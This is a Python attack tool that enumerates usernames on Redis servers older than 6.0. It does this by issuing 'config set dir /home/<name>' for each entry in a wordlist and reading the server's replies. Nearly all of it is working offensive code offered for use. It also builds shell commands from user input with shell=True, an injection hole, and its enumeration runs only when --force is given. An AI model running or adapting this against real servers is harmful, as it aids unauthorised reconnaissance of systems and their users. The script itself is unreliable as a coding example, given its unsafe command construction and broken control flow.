#!/usr/bin/env python3
# Will Only Work On Redis-Server < 6.0
# Tested On Redis-Server 4.0.14 Running On Ubuntu Server 23.10
# Creds: loganpkinfosec AKA Loki
# Github: https://github.com/loganpkinfosec

import subprocess
import argparse
import sys

def run_redis_command(command):
    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    return result.decode('utf-8').strip()
   

def test_redis_connection(ip, port, password):
    print('Testing Redis server connectivity...')
    auth_part = f"-a {password}" if password else ""
    test_cmd = f'redis-cli {auth_part} -p {port} -h {ip} ping'
    response = run_redis_command(test_cmd)
    if response == "PONG":
        print('Redis server is reachable. Proceeding with testing...')
    else:
        print(f"Connection error: Could not connect to Redis at {ip}:{port}.")
        sys.exit(1)

def check_directory_enumeration(ip, port, password):
    print('Detecting if usernames are enumerable...')
    auth_part = f"-a {password}" if password else ""
    cmd = f'redis-cli {auth_part} -p {port} -h {ip} config set dir /34345465869586985669879ThisIsNotADrectory158469485966548908908457894675897'
    result = run_redis_command(cmd)
    if "ERR Changing directory" in result:
        print('Usernames likely can be enumerated!')
    else:
        print('Usernames cannot be enumerated... Sorry')

def enumerate_usernames(ip, port, username_list, password):
    auth_part = f"-a {password}" if password else ""
    for name in username_list:
        name = name.strip()
        cmd = f'redis-cli {auth_part} -p {port} -h {ip} config set dir /home/{name}'
        result = run_redis_command(cmd)
        if "OK" in result:
            print(f'Found Username!: {name}')
            break

def main():
    parser = argparse.ArgumentParser(description='This tool attempts to enumerate Redis usernames using a word list. It connects to a specified Redis server and tests for common usernames by attempting to set directories within /home.')
    parser.add_argument('-ip', '--ip', help='IP address of the Redis server.', required=True)
    parser.add_argument('-p', '--port', help='Port of the Redis server.', type=int, default=6379)
    parser.add_argument('-w', '--wordlist', help='Recommended Wordlist: /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt', required=True)
    parser.add_argument('-f', '--force', help='Skip testing and force enumeration', action='store_true')
    parser.add_argument('-pass', '--password', help='Password for authentication', type=str, default="")
    args = parser.parse_args()

    
    with open(args.wordlist, "r") as username_list:
        if not args.force:
            test_redis_connection(args.ip, args.port, args.password)
            check_directory_enumeration(args.ip, args.port, args.password)
        else:
            print("Careful... Tests are disabled!")
            enumerate_usernames(args.ip, args.port, username_list, args.password)

if __name__ == "__main__":
    main()
